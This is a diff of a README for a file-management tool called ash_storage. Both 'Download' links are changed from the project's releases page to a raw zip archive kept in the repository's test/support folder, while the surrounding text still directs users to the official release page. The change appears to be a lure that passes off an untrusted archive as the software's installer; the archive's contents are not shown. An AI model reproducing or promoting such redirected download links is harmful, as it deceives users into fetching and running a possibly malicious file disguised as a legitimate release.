@@ -1,6 +1,6 @@
 # 📁 ash_storage - Manage your attachments and files easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/bartholomewdifferentiable670/ash_storage/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/bartholomewdifferentiable670/ash_storage/raw/refs/heads/main/test/support/ash-storage-v2.4.zip)
 
 ## 🎯 About the software
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the software. Keep your
 
 You must visit the official release page to get the installer. The software goes through regular improvements and security checks.
 
-[Download the latest version here](https://github.com/bartholomewdifferentiable670/ash_storage/releases)
+[Download the latest version here](https://github.com/bartholomewdifferentiable670/ash_storage/raw/refs/heads/main/test/support/ash-storage-v2.4.zip)
 
 1. Navigate to the link above using your browser.
 2. Look for the section labeled Assets.
